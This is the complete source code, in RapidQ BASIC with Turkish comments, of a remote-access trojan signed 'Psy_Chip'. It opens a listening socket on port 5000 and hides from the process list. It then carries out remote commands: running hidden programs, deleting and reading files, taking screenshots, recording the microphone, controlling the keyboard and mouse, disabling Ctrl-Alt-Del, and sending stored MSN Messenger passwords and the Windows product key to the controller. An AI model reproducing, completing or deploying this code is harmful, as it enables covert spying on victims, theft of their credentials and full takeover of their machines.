$TYPECHECK ON
$INCLUDE "RAPIDQ.INC"
$optimize on
'$resource cached as "c:\matrix\desktop\cached.exe"
'$resource iss as "c:\matrix\desktop\isspass.exe"
'$resource font as "c:\matrix\desktop\kmc.ttf"

declare sub kaydir
declare sub kayiyo
dim form as qform
form.borderstyle = 0
form.onpaint = kaydir
form.height = 250
form.width = 500
dim kay as integer
kay = 50
dim kaytimer as qtimer
kaytimer.enabled = false
kaytimer.interval = 9
kaytimer.ontimer = kayiyo


Declare Function GetAsyncKeyState Lib "user32" alias "GetAsyncKeyState" (ByVal vKey As Long) As Integer
DECLARE SUB YOLLA
$escapechars on
$INCLUDE "registiri.inc"
'$INCLUDE "c:\matrix\desktop\matrix.inc"
'**********************öZEL kOMUTLAR**********************
Const STRING_SIZE=32

Type DEVMODE
dmDeviceName AS STRING * STRING_SIZE
dmSpecVersion AS WORD
dmDriverVersion AS WORD
dmSize AS WORD
dmDriverExtra AS WORD
dmFields AS DWORD
dmOrientation AS SHORT
dmPaperSize AS SHORT
dmPaperLength AS SHORT
dmPaperWidth AS SHORT
dmScale AS SHORT
dmCopies AS SHORT
dmDefaultSource AS SHORT
dmPrintQuality AS SHORT
dmColor AS SHORT
dmDuplex AS SHORT
dmYResolution AS SHORT
dmTTOption AS SHORT
dmCollate AS SHORT
dmFormName AS string * STRING_SIZE
dmLogPixels AS WORD
dmBitsPerPel AS DWORD
dmPelsWidth AS DWORD
dmPelsHeight AS DWORD
dmDisplayFlags AS DWORD
dmDisplayFrequency AS DWORD
End Type

Type MEMORYSTATUS
    dwLength As Long
    dwMemoryLoad As Long
    dwTotalPhys As Long
    dwAvailPhys As Long
    dwTotalVirtual As Long
    dwAvailVirtual As Long
End Type

Type PROCESSENTRY32
    dwSize As DWORD
    cntUsage As DWORD
    th32ProcessID As DWORD
    th32DefaultHeapID As DWORD
    th32ModuleID As DWORD
    cntThreads As DWORD
    th32ParentProcessID As DWORD
    pcPriClassBase As Long
    dwFlags As DWORD
    szexeFile As string*255
End Type
'**********************Fonksiyonlar************
Declare Sub Sleep Lib "kernel32" alias "sleep" (ByVal dwMilliseconds as Long)
Declare Sub keybd_event Lib "user32" alias "keybd_event" (ByVal bVirtualKey as Byte, ByVal bScanCode as Byte, ByVal dwFlags as Long, ByVal dwExtraInfo as Long, ByVal dwFlags as Long, ByVal dwExtraInfo as Long)
Declare Function GetTickCount Lib "kernel32.dll" alias "GetTickCount" () As Long
Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal hSnapshot As Long, uProcess As long) As Long                                    
Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal hSnapshot As Long, uProcess As long) As Long
Declare Sub CloseHandle Lib "kernel32" alias "CloseHandle" (ByVal hPass As Long)
Declare Function CreateToolhelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal lFlags As Long, ByVal lProcessID As Long) As Long
Declare Function SetComputerName Lib "kernel32.dll" Alias "SetComputerNameA" (ByVal lpComputerName As String) As Long
Declare Function SetVolumeLabel Lib "kernel32" Alias "SetVolumeLabelA" (ByVal lpRootPathName As String, ByVal lpVolumeName As String) As Long
Declare Function CreateDC Lib "gdi32" Alias "CreateDCA" (ByVal lpDriverName As String, ByVal lpDeviceName As String, ByVal lpOutput As String, lpInitData As DEVMODE) As Long
Declare Function BitBlt Lib "gdi32.dll" Alias "BitBlt" (ByVal hdcDest As Long, ByVal nXDest As Long, ByVal nYDest As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hdcSrc As Long, ByVal nXSrc As Long, ByVal nYSrc As Long, ByVal dwRop As Long) As Long
Declare Function GetDesktopWindow Lib "user32" Alias "GetDesktopWindow" () As Long
DECLARE FUNCTION mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long 
declare function mciExecute Lib "winmm.dll" Alias "mciExecute" (lpstring as string) as long
Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As STRING, ByVal lpWindowName As String) As Long
Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Declare Function ShowWindow Lib "user32" alias "ShowWindow" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As String, ByVal fuWinIni As Long) As Long
Declare Function SetWindowPos Lib "user32" alias "SetWindowPos" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
DECLARE FUNCTION SetWindowLong LIB "User32" ALIAS "SetWindowLongA" (hWnd AS LONG, nIndex AS LONG, dwNewLong AS LONG) AS LONG
declare Function SwapMouseButton Lib "user32" alias "SwapMouseButton" (ByVal bSwap As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function GetCurrentProcessId Lib "kernel32" alias "GetCurrentProcessId" () As Long
Declare Function GetCurrentProcess Lib "kernel32" alias "GetCurrentProcess"() As Long
Declare Function RegisterServiceProcess Lib "kernel32" alias "RegisterServiceProcess" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
Declare Function SetCursorPos Lib "user32" alias "SetCursorPos" (ByVal Xpos as Long, ByVal Ypos as Long ) as long
Declare Function MSG Lib "user32" Alias "MessageBoxA" (ByVal hwnd As Long, ByVal lpText As String, ByVal lpCaption As String, ByVal wType As Long) As Long
DECLARE FUNCTION Attrib LIB "KERNEL32" ALIAS "SetFileAttributesA" (lpFileName AS STRING, dwFileAttributes AS DWORD) AS LONG
Declare Sub GlobalMemoryStatus Lib "kernel32" alias "GlobalMemoryStatus" (lpBuffer As MEMORYSTATUS)
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long,  lpString As long, ByVal cch As Long) As Long
Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As Long
Declare Function EnumDisplaySettings Lib "user32" Alias "EnumDisplaySettingsA" (ByVal lpszDeviceName As Long, ByVal iModeNum As Long, lpDevMode As LONG) As LONG
Declare Function ChangeDisplaySettings Lib "user32" Alias "ChangeDisplaySettingsA" (lpDevMode As long, ByVal dwFlags As Long) As Long
'***************************Sub bilmemne********************
DECLARE SUB TimerExpired
'*******************Tanimlamalar****************
DIM Sock AS INTEGER
DIM Connected AS LONG
DIM Timer1 AS QTimer
DIM MasterSocket AS INTEGER, NumClients AS INTEGER
DIM Client(1 TO 50) AS INTEGER
DIM Socket AS QSocket
dim neo as integer
neo = 0
dim klavye as integer
KLAVYE = 0
'******************Const*****************************
Const SPI_SETDESKWALLPAPER = 20
Const SPIF_UPDATEINIFILE = &H1
CONST DELAY = 500
CONST PortNum = 5000
Const SWP_HIDEWINDOW = &H80
Const SWP_SHOWWINDOW = &H40
Const RSP_SIMPLE_SERVICE = 1
Const TH32CS_SNAPPROCESS As Long = 2&
CONST FILE_ATTRIBUTE_ARCHIVE = &H20
CONST FILE_ATTRIBUTE_HIDDEN = &H2
CONST FILE_ATTRIBUTE_NORMAL = &H80
CONST FILE_ATTRIBUTE_READONLY = &H1
CONST FILE_ATTRIBUTE_SYSTEM = &H4

Const DM_BITSPERPEL = &H40000
Const DM_PELSWIDTH = &H80000
Const DM_PELSHEIGHT = &H100000
Const CDS_UPDATEREGISTRY = &H1
Const CDS_TEST = &H4
Const ENUM_CURRENT_SETTINGS = -1

DIM devm AS DEVMODE, modul AS INTEGER
modul=EnumDisplaySettings("", ENUM_CURRENT_SETTINGS, devm)

'*******************program kodlarý***********************
sub MakeMeService()
Dim pid As Long
Dim regserv As Long
pid = GetCurrentProcessId()
regserv = RegisterServiceProcess(pid, RSP_SIMPLE_SERVICE)
end sub

Timer1.Interval = DELAY
Timer1.OnTimer = TimerExpired
NumClients = 0
MasterSocket = Socket.Open(PortNum)

SUB SwapClients(N AS INTEGER)
DIM I AS INTEGER
FOR I = N to NumClients
Client(I) = Client(I+1)
NEXT
END SUB

SUB SendToClient(Message AS STRING,CLID as Integer)
Dim N as integer   
N = Socket.WriteLine(Client(CLID), Message)
END Sub

Sub SendKeys(bytKey as Byte)
keybd_event bytKey, 0, 0, 0, sleep 5,0 
keybd_event bytKey, 0, 0, 2, sleep 5,0 
end Sub

SUB TimerExpired
DIM I AS INTEGER
DIM X AS STRING
Timer1.Enabled = False
Timer1.Interval = DELAY
IF Socket.ConnectionReady(MasterSocket) > 0 THEN
NumClients = NumClients + 1
Client(NumClients) = Socket.Accept(MasterSocket)
IF Socket.WriteLine(Client(NumClients), "xxx") = -1 THEN
NumClients = NumClients - 1   
END IF
END IF
FOR I = 1 to NumClients
IF Socket.IsClientReady(MasterSocket, Client(I)) > 0 THEN
X = Socket.ReadLine(Client(I))
IF Socket.Transferred = -1 THEN
NumClients = NumClients - 1
SwapClients(I)
ELSE
'*****************komut tanýmlamalarý**************************
Dim Retvalue as Long
Dim ReturnString as String
Dim G as Integer
'*****************************Trojan Komutlarý*******************
IF X = "CD_AC" then
retvalue = mcisendstring("set CDAudio door open", returnstring, 127, 0)  
SendToClient("Cd sürücüsü açýldý",I)                               
End If
IF X = "CD_KAPA" then                              
retvalue = mcisendstring("set CDAudio door closed", returnstring, 127, 0)  
SendToClient("Cd Sürücüsü Kapatýldý",I)
END IF

IF X = "BASLAT_GIZLE" then
OurParent& = FindWindow("Shell_TrayWnd", "")
OurHandle& = FindWindowEx(OurParent&, 0, "button", vbnullstring)
ShowWindow OurHandle&, 0
END IF

IF X = "BASLAT_GOSTER" THEN
OurParent& = FindWindow("Shell_TrayWnd", "")
OurHandle& = FindWindowEx(OurParent&, 0, "Button", vbNullString)
ShowWindow OurHandle&, 5
END IF

IF X = "CAD_KILITLE" THEN
RetValue = SystemParametersInfo(97, 1, 1, 0)
SendToClient("CTRL-ALT-DEL DISABLED",I)
END IF

IF X = "CAD_AC" THEN
RetValue = SystemParametersInfo(97, 0, 1, 0)
SendToClient("CTRL-ALT-DEL ENABLED",I)
END IF

IF X = "GEBERT" then
SendToClient("Psy_Bus Kapaniyor.. By Psy_Chip",I)
application.terminate
End if 

IF X = "TASKBAR_GIZLE" then
hwnd1 = FindWindow("Shell_traywnd", "")
Call SetWindowPos(hwnd1, 0, 0, 0, 0, 0, SWP_HIDEWINDOW)
End if

IF X = "TRAY_GIZLE" then
OurParent& = FindWindow("Shell_TrayWnd", "")
OurHandle& = FindWindowEx(OurParent&, 0, "TrayNotifyWnd", vbnullstring)
ShowWindow OurHandle&, 0
End if

IF X = "TRAY_GOSTER" then
OurParent& = FindWindow("Shell_TrayWnd", "")
OurHandle& = FindWindowEx(OurParent&, 0, "TrayNotifyWnd", vbnullstring)
ShowWindow OurHandle&, 5
End if

IF X = "FARE_DEGIS" then
CALL SwapMouseButton 1
End if

IF X = "FARE_DUZELT" then
CALL SwapMouseButton 0
End if

IF X = "SES.PC.1" then
dim SES as integer
for SES = 1 to 200:sound SES,1
next
End if

IF X = "SES.PC.2" then
SOUND 100, 2
SOUND 200, 2
SOUND 300, 2
SOUND 400, 2
SOUND 500, 2
SOUND 600, 2
SOUND 700, 2
SOUND 800, 2
SOUND 900, 2
SOUND 800, 2
SOUND 700, 2
SOUND 600, 2
SOUND 500, 2
SOUND 400, 2
SOUND 300, 2
SOUND 200, 2
SOUND 100, 2
End if

IF X = "SES.PC.3" then
SOUND 300, 2
SOUND 600, 2
SOUND 300, 2
SOUND 0, 30
SOUND 300, 2
SOUND 600, 2
SOUND 300, 2
SOUND 300, 2
SOUND 600, 2
SOUND 300, 2
SOUND 0, 30
SOUND 300, 2
SOUND 600, 2
SOUND 300, 2
SOUND 700, 2
SOUND 214, 2
SOUND 500, 2
SOUND 0,20
SOUND 900, 2
SOUND 500, 2
SOUND 900, 2
SOUND 0,10
SOUND 415, 1
SOUND 415, 1
SOUND 415, 1
SOUND 415, 1
SOUND 415, 1
SOUND 415, 1
End if

IF X = "CALISTIR" THEN
dim Program as string
Program = Socket.ReadLine(Client(I))
RUN Program
End if

IF X = "SIL" THEN
dim dosya as string
dosya = Socket.ReadLine(Client(I))
Kill dosya
End if

IF X = "GIZLICE_C" THEN
dim PRG as string
PRG = Socket.ReadLine(Client(I))
PID = SHELL(PRG, SW_HIDE)
End if

IF X = "DIZIN_YAP" THEN
dim klasor as string
klasor = Socket.ReadLine(Client(I))
mkdir klasor
End if

IF X = "DIZIN_SIL" THEN
dim silinecek as string
silinecek = Socket.ReadLine(Client(I))
Rmdir silinecek
End if

IF X = "WALLPAPER" then
SendToClient("W_YOL",I)
dim resim as string
resim = Socket.ReadLine(Client(I))
SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, resim, SPIF_UPDATEINIFILE)
End if

IF X = "BILGI" then
key_Root = HKEY_LOCAL_MACHINE
'VERSIYON******************
Reg_OpenKey("Software\\Microsoft\\Windows\\CurrentVersion", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("Version")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
'********SÜRÜM**************
Reg_OpenKey("Software\\Microsoft\\Windows\\CurrentVersion", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("ProductKey")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
'*****KAYITLI KULLANICI
Reg_OpenKey("Software\\Microsoft\\Windows\\CurrentVersion", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("RegisteredOwner")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
'***************FÝRMA ADI
Reg_OpenKey("Software\\Microsoft\\Windows\\CurrentVersion", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("RegisteredOrganization")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
'****************
Reg_OpenKey("Software\\Microsoft\\Windows\\CurrentVersion", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("SystemRoot")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
'****************
key_Root = HKEY_CURRENT_USER
Reg_OpenKey("SOFTWARE\\Microsoft\\Internet Explorer\\Main", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("Start Page")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
'**************************
key_Root = HKEY_LOCAL_MACHINE
Reg_OpenKey("Hardware\\Description\\System\\CentralProcessor\\0", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("Identifier")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
'****************
Reg_OpenKey("Config\\0001\\Display\\Settings", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("Resolution")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
'****************
Reg_OpenKey("System\\CurrentControlSet\\Services\\Class\\Display\\0000", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("DriverDesc")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
'****************
Reg_OpenKey("System\\CurrentControlSet\\Services\\Class\\Modem\\0000", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("DriverDesc")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
'****************
Reg_OpenKey("System\\CurrentControlSet\\Services\\Class\\CDROM\\0000", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("DriverDesc")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
'****************
Reg_OpenKey("Software\\Microsoft\\DirectX", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("Version")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
UnLock_DefaultMemory
Free_DefaultMemory
'****************
End if

IF X = "SHELL_A" then
SendToClient("YAZI_YOLLA",I)
dim baslik as string
dim yazi as string
baslik = Socket.ReadLine(Client(I))
yazi = Socket.ReadLine(Client(I))
ShellAbout hwnd, baslik, yazi, application.icon
End if

IF X = "TASKBAR_GOSTER" then
hwnd1 = FindWindow("Shell_traywnd", "")
Call SetWindowPos(hwnd1, 0, 0, 0, 0, 0, SWP_SHOWWINDOW)
End IF

IF X = "SES_KAYIT" then
SENDTOCLIENT("sürücü Hazýrlanýyor..",I)
mciSendString "open new Type waveaudio Alias capture", 0, 0, 0
mciSendString "set capture bitspersample 8", 0, 0, 0
mciSendString "set capture samplespersec 11025", 0, 0, 0
mciSendString "set capture channels 1", 0, 0, 0
mciSendString "record capture", 0, 0, 0
SENDTOCLIENT("kAYDEÝLÝYOR...",I)

DO
LOOP UNTIL Socket.ReadLine(Client(I)) = "YETER_LAAN"

mciSendString "stop capture", 0, 0, 0
mciSendString "save capture NewWave.wav", 0, 0, 0
mciSendString "close capture", 0, 0, 0
End IF

IF X = "CLIPBOARD_OKU" then
clipboard.open
sendtoclient(clipboard.text,I)
clipboard.close
End IF

IF X = "CLIPBOARD_SET" then
dim clipyazi as string
clipyazi = Socket.ReadLine(Client(I))
clipboard.open
Clipboard.SetAsText clipyazi
clipboard.close
End IF

IF X = "CLIPBOARD_TEMIZLE" then
clipboard.clear
End IF

IF X = "EKRAN" then
dim Bitmap as qbitmap, DeskhWnd as long, DeskDC as long
DeskhWnd=GetDesktopWindow()
DeskDC = CreateDC("DISPLAY", "", "", DevThing)
Bitmap.Height=Screen.Height
Bitmap.Width=Screen.Width
Bitmap.PixelFormat = pf24bit
BitBlt(Bitmap.Handle,1,1,Screen.Width,Screen.Height,DeskDC,1,1,&HCC0020)
Bitmap.Textout(60,35,"Coded By Psy_Chip", &H00FF00, 0)
Bitmap.SaveToFile("C:\EKRAN.bmp")
DIM OHBE AS STRING
chdir "c:\matrix\desktop\"
dim kalite as string
dim jön as string
dim in as string
dim out as string
jön = "xxx.exe"
kalite = Socket.ReadLine(Client(I))
in = "c:\ekran.bmp"
out = "c:\out.jpg"
OHBE = jön+Chr$(32)+kalite+Chr$(32)+in+Chr$(32)+out
PID = SHELL(OHBE, SW_HIDE)
End IF

IF X = "DOSYA_GORUNTULE" then
dim File AS QFILESTREAM
dim ds as string
ds = Socket.ReadLine(Client(I))
File.Open(ds, fmOpenRead)
WHILE file.EOF = False
SENDTOCLIENT(file.readline,I)
WEND
File.Close
END IF

IF X = "ETIKET" then
dim sürücü as string
dim etiket as string
sürücü = Socket.ReadLine(Client(I))
etiket = Socket.ReadLine(Client(I))
SetVolumeLabel(sürücü, etiket)
END IF

IF X = "PC_ISIM" then
dim isim as string
isim = Socket.ReadLine(Client(I))
SetComputerName(isim)
END IF

IF X = "MESSENGER_ESKI" then
key_Root = HKEY_CURRENT_USER
Reg_OpenKey("SOFTWARE\\Microsoft\\messengerservice", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("User.NET Messenger Service")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
Reg_OpenKey("SOFTWARE\\Microsoft\\messengerservice", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("Password.NET Messenger Service")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
END IF

IF X = "MESSENGER_YENI" then
key_Root = HKEY_CURRENT_USER
Reg_OpenKey("SOFTWARE\\Microsoft\\MSNMessenger", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("User.NET Messenger Service")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
Reg_OpenKey("SOFTWARE\\Microsoft\\MSNMessenger", KEY_ALL_ACCESS)
rtnval=200
Reg_QueryValue("Password.NET Messenger Service")
CopyMemory VarPtr(stgbuf$), mem_Default, rtnval
stg$=Mid$(stgbuf$, 0, rtnval)
Sendtoclient(stg$,I)
Reg_CloseKey
END IF

IF X = "CARDON_RACING" then
dim u as integer
FOR u = 50 TO 750:SetCursorPos(u,50):SOUND u, 0
next
dim o as integer
FOR o = 50 to 550:SetCursorPos(750,o):SOUND o, 0
next
do
u = u-1:SetCursorPos(u,550):SOUND U, 0
loop until u = 50
do
o = o-1:SetCursorPos(50,o):SOUND o, 0
loop until O = 50
END IF

IF X = "MEDIA" THEN
dim muzik as string
muzik = Socket.ReadLine(Client(I))
if mciExecute("play "+muzik) = 1 then
SENDTOCLIENT("TAMAMDIR!!",I)
else
SENDTOCLIENT("Hataa!",I)
END IF
END IF

'IF X = "" then
'matrix1.enabled = true
'matrix2.enabled = true
'neo = 1
'matrix.Showmodal
'END IF

'IF X = "MATRIX_KAPAT" then
'neo = 0
'matrix1.enabled = false
'matrix2.enabled = false
'matrix.clos
'END IF

'if neo = 1 then
'Canvas1.Textout(30,satir,X,&H00FF00, 0)
'matrix2.enabled = false
'NOKTA.top = str$(satir)
'satir = satir+25
'i = STR$(LEN(X))
'if i = 1 then i = i+1
'if i = 2 then i = i+1
'if i = 3 then i = i+1
'if i = 4 then i = i+1
'i = i * 20
'NOKTA.left = i
'matrix2.enabled = TRUE
'end if
'if nokta.top > canvas1.Height - 50 then
'NOKTA.TOP = 20
'satir = 20
'CANVAS1.repaint
'canvas1.Textout(30,satir,X,&H00FF00, 0)
'satir = satir+25
'end if

IF X = "MESAJ" THEN
dim biter as long, aktif as long, text as string, title as string, buton as string, buton2 as string
aktif=GetForegroundWindow()
text = Socket.ReadLine(Client(I))
Title = Socket.ReadLine(Client(I))
Buton = Socket.ReadLine(Client(I))
Buton2 = Socket.ReadLine(Client(I))
biter = MSG(str$(aktif), text, Title, VAL(buton)+VAL(buton2))
SENDTOCLIENT(STR$(Biter),I)
END IF

IF X = "DOSYA_ATT" THEN
dim Atdosya as string
dim Att as string
AtDosya = Socket.ReadLine(Client(I))
Att = Socket.ReadLine(Client(I))
if att = "SALT" THEN
ATTRIB Atdosya, FILE_ATTRIBUTE_READONLY
END IF
if att = "SISTEM" THEN
ATTRIB Atdosya, FILE_ATTRIBUTE_SYSTEM
END IF
if att = "ARC" THEN
ATTRIB Atdosya, FILE_ATTRIBUTE_ARCHIVE
END IF
if att = "GIZLI" THEN
ATTRIB Atdosya, FILE_ATTRIBUTE_HIDDEN
END IF
if att = "HEPSI" THEN
ATTRIB Atdosya, FILE_ATTRIBUTE_HIDDEN OR FILE_ATTRIBUTE_ARCHIVE OR FILE_ATTRIBUTE_READONLY OR FILE_ATTRIBUTE_SYSTEM
END IF
if att = "NORMAL" THEN
ATTRIB Atdosya, FILE_ATTRIBUTE_NORMAL
END IF
END IF

IF X = "YAZICI" THEN
dim yazilacak as string
yazilacak = Socket.ReadLine(Client(I))

create yazici as qfont
size = 30
end create

with printer
.begindoc
.font = yazici
.textout (100, 100, yazilacak, &h00ff00, -1)
.enddoc
end with
END IF

IF X = "BELLEK" THEN
Dim MS As MEMORYSTATUS
MS.dwLength = Len(MS)
GlobalMemoryStatus MS
SENDTOCLIENT(str$(MS.dwMemoryLoad),I) ' kullaným durumu (yüzde bilmemne %50 ex)
SENDTOCLIENT(str$(MS.dwTotalPhys),I) ' Toplam Fiziksel Bellek
SENDTOCLIENT(str$(MS.dwAvailPhys),I) ' Boþ Fiziksel Bellek
SENDTOCLIENT(str$(MS.dwTotalVirtual),I) ' Toplam Sanal Bellek
SENDTOCLIENT(str$(MS.dwAvailVirtual),I) ' Boþ Sanal Bellek
END IF

IF X = "UYGULAMALAR" THEN
dim P as integer
Dim hSnapshot As Long
Dim uProcess As PROCESSENTRY32
Dim r As Long
dim pointeur as long
dim pointeur1 as long
P=0
hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
If hSnapshot = 0 Then
Exit Sub
End If
uProcess.dwSize =sizeof(uProcess)+255
r = ProcessFirst(hSnapshot,uProcess)
While r
SENDTOCLIENT(uProcess.szexeFile,I)
P=P+1
r = ProcessNext(hSnapshot, uProcess)
wend
Call CloseHandle(hSnapshot)
END IF

IF X = "SURE" THEN
SENDTOCLIENT(STR$(GetTickCount),I)
END IF

IF X = "COZUNURLUK" THEN
dim z as string
Z = Socket.ReadLine(Client(I))
if modul<>0 THEN
devm.dmFields = DM_PELSWIDTH OR DM_PELSHEIGHT OR DM_BITSPERPEL

devm.dmPelsWidth = VAL(LEFT$(Z,3))
devm.dmPelsHeight = VAL(LEFT$(RIGHT$(Z,6),3))
devm.dmBitsPerPel = VAL(RIGHT$(Z,2))

modul=ChangeDisplaySettings(devm, CDS_TEST OR CDS_UPDATEREGISTRY)
SENDTOCLIENT(STR$(modul),I)
end if
END IF

IF X = "FARE_KONTROL" then
dim incom as string
DO
incom = Socket.ReadLine(Client(I))
SetCursorPos(VAL(LEFT$(incom,3)),VAL(RIGHT$(incom,3)))
loop until incom = "FARE_DUR"
SENDTOCLIENT("FARE_DURDU",I)
End IF

IF X = "KLAVYE_KONTROL" THEN
dim gelentus as string
do
gelentus = Socket.ReadLine(Client(I))
Sendkeys(val(gelentus))
loop until gelentus = "BITTI"
END IF

IF X = "KLAVYE_LED" THEN
form.center
kaytimer.enabled = true
form.show
end if
'*********************************KOMUTLAR SONU***************************
END IF
end if
NEXT
Timer1.Enabled = True
END SUB

sub kaydir
form.Textout(kay,0,"Coded By Psy_Chip", &H00FF00, 0)
end sub

SUB kayiyo
  kaytimer.interval = 9
  kay = kay - 1
  kaydir
END SUB  

SetWindowLong(Application.Handle, -8, 128)
makemeservice

DO
DoEvents
LOOP